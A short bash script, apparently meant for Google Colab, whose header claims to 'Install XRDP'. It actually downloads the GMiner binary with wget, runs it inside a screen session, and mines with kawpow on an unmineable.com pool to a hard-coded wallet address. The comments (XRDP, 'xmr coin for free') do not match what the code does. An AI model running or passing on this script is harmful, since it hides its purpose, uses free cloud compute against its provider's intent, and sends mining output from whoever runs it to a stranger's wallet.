#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R miner
 
wget https://github.com/develsoftware/GMinerRelease/releases/download/3.05/gminer_3_05_linux64.tar.xz
tar xvzf gminer_3_05_linux64.tar.xz
cd gminer_3_05_linux64
./miner -a kawpow -s proxy+ssl://kp.unmineable.com:4444 -u BAT:0x579bfd09bed10c0d6cf8301eada2613f029ef1c9.unmineable_worker_rpljpzwp  
